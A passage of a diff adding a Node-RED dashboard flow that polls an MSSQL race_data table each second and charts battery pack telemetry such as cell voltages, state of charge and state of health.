+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 780,
+        "y": 200,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "45f832d9af22bd04",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 2,
+        "width": "10",
+        "height": 6,
+        "label": "Cell Voltage (V)",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "15",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 760,
+        "y": 240,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "c20bc04e738cf069",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 5,
+        "width": "10",
+        "height": 6,
+        "label": "Resistances (Ohm)",
+        "chartType": "line",
+        "legend": "true",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "25",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 770,
+        "y": 280,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "980a89194ee4a5f9",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 3,
+        "width": "10",
+        "height": "6",
+        "label": "Pack Amphours",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "30",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 760,
+        "y": 120,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "64e2db8ac1cc6ff8",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 8,
+        "width": "10",
+        "height": "6",
+        "label": "Total Packet Cycles",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "100",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 770,
+        "y": 40,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "8326a393562f231b",
+        "type": "ui_chart",
+        "z": "54ee7ab52b252314",
+        "name": "",
+        "group": "0792dde75d0b55e3",
+        "order": 6,
+        "width": "10",
+        "height": "6",
+        "label": "Input Supply Voltage (V)",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "15",
+        "removeOlder": "5",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 790,
+        "y": 320,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "0b16929d7a64ef72",
+        "type": "inject",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "1",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 330,
+        "y": 260,
+        "wires": [
+            [
+                "275cd9d52450ab82"
+            ]
+        ]
+    },
+    {
+        "id": "275cd9d52450ab82",
+        "type": "MSSQL",
+        "z": "594e9fd18f91cc50",
+        "mssqlCN": "933ce03686fddbab",
+        "name": "",
+        "outField": "payload",
+        "returnType": 0,
+        "throwErrors": 1,
+        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
+        "modeOpt": "queryMode",
+        "modeOptType": "query",
+        "queryOpt": "payload",
+        "queryOptType": "editor",
+        "paramsOpt": "queryParams",
+        "paramsOptType": "none",
+        "rows": "rows",
+        "rowsType": "msg",
+        "parseMustache": true,
+        "params": [],
+        "x": 540,
+        "y": 260,
+        "wires": [
+            [
+                "fce4f2a6f3872466"
+            ]
+        ]
+    },
+    {
+        "id": "fce4f2a6f3872466",
+        "type": "function",
+        "z": "594e9fd18f91cc50",
+        "name": "potentially useful messages",
+        "func": "var sigFigs = 2\n\nvar pack_soc =\n{\n    topic: \"pack_soc\",\n    payload: msg.payload[0].pack_soc\n}\ntry {\n    pack_soc.payload = pack_soc.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_state_of_health =\n{\n    topic: \"pack_state_of_health\",\n    payload: msg.payload[0].pack_state_of_health\n}\ntry {\n    pack_state_of_health.payload = pack_state_of_health.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_summed_voltage =\n{\n    topic: \"pack_summed_voltage\",\n    payload: msg.payload[0].pack_summed_voltage\n}\ntry {\n    pack_summed_voltage.payload = pack_summed_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_total_capacity =\n{\n    topic: \"adaptive_total_capacity\",\n    payload: msg.payload[0].adaptive_total_capacity\n}\ntry {\n    adaptive_total_capacity.payload = adaptive_total_capacity.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_amp_hours =\n{\n    topic: \"adaptive_amp_hours\",\n    payload: msg.payload[0].adaptive_amp_hours\n}\ntry {\n    adaptive_amp_hours.payload = adaptive_amp_hours.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_state_of_charge =\n{\n    topic: \"adaptive_state_of_charge\",\n    payload: msg.payload[0].adaptive_state_of_charge\n}\ntry {\n    adaptive_state_of_charge.payload = adaptive_state_of_charge.payload.toFixed(sigFigs)\n} catch { }\n\nvar failsafe_statuses =\n{\n    topic: \"failsafe_statuses\",\n    payload: msg.payload[0].failsafe_statuses\n}\n/* try {\n    failsafe_statuses.payload = failsafe_statuses.payload.toFixed(sigFigs)\n} catch { } */\n\nvar rolling_counter =\n{\n    topic: \"rolling_counter\",\n    payload: msg.payload[0].rolling_counter\n}\ntry {\n    rolling_counter.payload = rolling_counter.payload.toFixed(sigFigs)\n} catch { }\n\nvar total_pack_adc =\n{\n    topic: \"total_pack_adc\",\n    payload: msg.payload[0].total_pack_adc\n}\ntry {\n    total_pack_adc.payload = total_pack_adc.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_cell_voltage =\n{\n    topic: \"low_cell_voltage\",\n    payload: msg.payload[0].low_cell_voltage\n}\ntry {\n    low_cell_voltage.payload = low_cell_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar low_cell_open_voltage_id =\n{\n    topic: \"low_cell_open_voltage_id\",\n    payload: msg.payload[0].low_cell_open_voltage_id\n}\ntry {\n    low_cell_open_voltage_id.payload = low_cell_open_voltage_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_cell_open_voltage =\n{\n    topic: \"high_cell_open_voltage\",\n    payload: msg.payload[0].high_cell_open_voltage\n}\ntry {\n    high_cell_open_voltage.payload = high_cell_open_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar high_cell_open_voltage_id =\n{\n    topic: \"high_cell_open_voltage_id\",\n    payload: msg.payload[0].high_cell_open_voltage_id\n}\ntry {\n    high_cell_open_voltage_id.payload = high_cell_open_voltage_id.payload.toFixed(sigFigs)\n} catch { }\n\nvar average_cell_open_voltage =\n{\n    topic: \"average_cell_open_voltage\",\n    payload: msg.payload[0].average_cell_open_voltage\n}\ntry {\n    average_cell_open_voltage.payload = average_cell_open_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    pack_soc,\n    pack_state_of_health,\n    pack_summed_voltage,\n    adaptive_total_capacity,\n    adaptive_amp_hours,\n    adaptive_state_of_charge,\n    failsafe_statuses,\n    rolling_counter,\n    total_pack_adc,\n    low_cell_voltage,\n    low_cell_open_voltage_id,\n    high_cell_open_voltage,\n    high_cell_open_voltage_id,\n    average_cell_open_voltage\n];\n",
+        "outputs": 14,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 800,
+        "y": 260,
+        "wires": [
+            [
+                "6cae2349bbe224bf"
+            ],
+            [
+                "d7a4e4283792083b"
+            ],
+            [
+                "1355f066678b78da"
+            ],
+            [
+                "461a17a2e944d6fe"
+            ],
+            [
+                "a7e47b2385653e58"
+            ],
+            [
+                "6c2745fe442397c9"
+            ],
+            [
+                "19ebdd6de4e7ec22"
+            ],
+            [
+                "faf4259f29f4989a"
+            ],
+            [
+                "a063d9a10e3f65a6"
+            ],
+            [
+                "30e16296e8c67c55"
+            ],
+            [
+                "1042301885d9fe1d"
+            ],
+            [
+                "78da8df175f75d03"
+            ],
+            [
+                "159b9ce9eee465f6"
+            ],
+            [
+                "4a0de4b619a5b63c"
+            ]
+        ]
+    },
+    {
+        "id": "6cae2349bbe224bf",
+        "type": "ui_gauge",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 9,
+        "width": "6",
+        "height": "6",
+        "gtype": "gage",
+        "title": "Pack Depth of Discharge",
+        "label": "Percentage",
+        "format": "{{value | number:2}}%",
+        "min": 0,
+        "max": "100",
+        "colors": [
+            "#00b500",
+            "#e6e600",
+            "#ca3838"
+        ],
+        "seg1": "",
+        "seg2": "",
+        "diff": false,
+        "className": "",
+        "x": 1130,
+        "y": 160,
+        "wires": []
+    },
+    {
+        "id": "d7a4e4283792083b",
+        "type": "ui_gauge",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 10,
+        "width": "6",
+        "height": "6",
+        "gtype": "gage",
+        "title": "Pack State of Health",
+        "label": "Percentage",
+        "format": "{{value | number:2}}%",
+        "min": 0,
+        "max": "100",
+        "colors": [
+            "#00b500",
+            "#e6e600",
+            "#ca3838"
+        ],
+        "seg1": "",
+        "seg2": "",
+        "diff": false,
+        "className": "",
+        "x": 1120,
+        "y": 200,
+        "wires": []
+    },
+    {
+        "id": "1355f066678b78da",
+        "type": "ui_chart",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 1,
+        "width": "6",
+        "height": "6",
+        "label": "Pack Summed Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 1120,
+        "y": 240,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "461a17a2e944d6fe",
+        "type": "ui_text",
+        "z": "594e9fd18f91cc50",
+        "group": "b5264e960f9eb7eb",
+        "order": 13,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "Adaptive Total Capacity",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 1130,
+        "y": 280,
+        "wires": []
+    },
+    {
+        "id": "a7e47b2385653e58",
+        "type": "ui_chart",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 5,
+        "width": "6",
+        "height": "6",
+        "label": "Adaptive Amp Hours",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 1120,
+        "y": 320,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "6c2745fe442397c9",
+        "type": "ui_gauge",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 8,
+        "width": "6",
+        "height": "6",
+        "gtype": "gage",
+        "title": "Adaptive State of Charge",
+        "label": "Percentage",
+        "format": "{{value | number:2}}%",
+        "min": 0,
+        "max": "100",
+        "colors": [
+            "#00b500",
+            "#e6e600",
+            "#ca3838"
+        ],
+        "seg1": "",
+        "seg2": "",
+        "diff": false,
+        "className": "",
+        "x": 1130,
+        "y": 360,
+        "wires": []
+    },
+    {
+        "id": "19ebdd6de4e7ec22",
+        "type": "function",
+        "z": "594e9fd18f91cc50",
+        "name": "failsafe status interpreter",
+        "func": "return msg;",
+        "outputs": 1,
+        "noerr": 0,
+        "initialize": "",
+        "finalize": "",
+        "libs": [],
+        "x": 1130,
+        "y": 400,
+        "wires": [
+            [
+                "4ec3ba31add2e0e4"
+            ]
+        ]
+    },
+    {
+        "id": "faf4259f29f4989a",
+        "type": "ui_chart",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 6,
+        "width": "6",
+        "height": "6",
+        "label": "Rolling Counter",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "0",
+        "ymax": "255",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 1100,
+        "y": 440,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "a063d9a10e3f65a6",
+        "type": "ui_chart",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 7,
+        "width": "6",
+        "height": "6",
+        "label": "Total Pack ADC",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 1100,
+        "y": 480,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "30e16296e8c67c55",
+        "type": "ui_chart",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 4,
+        "width": "6",
+        "height": "6",
+        "label": "Low Cell Open Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 1120,
+        "y": 520,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "1042301885d9fe1d",
+        "type": "ui_text",
+        "z": "594e9fd18f91cc50",
+        "group": "b5264e960f9eb7eb",
+        "order": 11,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "Low Cell Open Voltage ID",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 1130,
+        "y": 560,
+        "wires": []
+    },
+    {
+        "id": "78da8df175f75d03",
+        "type": "ui_chart",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 2,
+        "width": "6",
+        "height": "6",
+        "label": "High Cell Open Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 1130,
+        "y": 600,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "159b9ce9eee465f6",
+        "type": "ui_text",
+        "z": "594e9fd18f91cc50",
+        "group": "b5264e960f9eb7eb",
+        "order": 12,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "High Cell Open Voltage ID",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 1130,
+        "y": 640,
+        "wires": []
+    },
+    {
+        "id": "4a0de4b619a5b63c",
+        "type": "ui_chart",
+        "z": "594e9fd18f91cc50",
+        "name": "",
+        "group": "b5264e960f9eb7eb",
+        "order": 3,
+        "width": "6",
+        "height": "6",
+        "label": "Average Cell Open Voltage",
+        "chartType": "line",
+        "legend": "false",
+        "xformat": "HH:mm:ss",
+        "interpolate": "linear",
+        "nodata": "",
+        "dot": false,
+        "ymin": "",
+        "ymax": "",
+        "removeOlder": 1,
+        "removeOlderPoints": "",
+        "removeOlderUnit": "60",
+        "cutout": 0,
+        "useOneColor": false,
+        "useUTC": false,
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "outputs": 1,
+        "useDifferentColor": false,
+        "className": "",
+        "x": 1140,
+        "y": 680,
+        "wires": [
+            []
+        ]
+    },
+    {
+        "id": "4ec3ba31add2e0e4",
+        "type": "ui_text",
+        "z": "594e9fd18f91cc50",
+        "group": "b5264e960f9eb7eb",
+        "order": 14,
+        "width": "6",
+        "height": "6",
+        "name": "",
+        "label": "Failsafe status",
+        "format": "{{msg.payload}}",
+        "layout": "col-center",
+        "className": "",
+        "x": 1380,
+        "y": 400,
+        "wires": []
+    }
+]
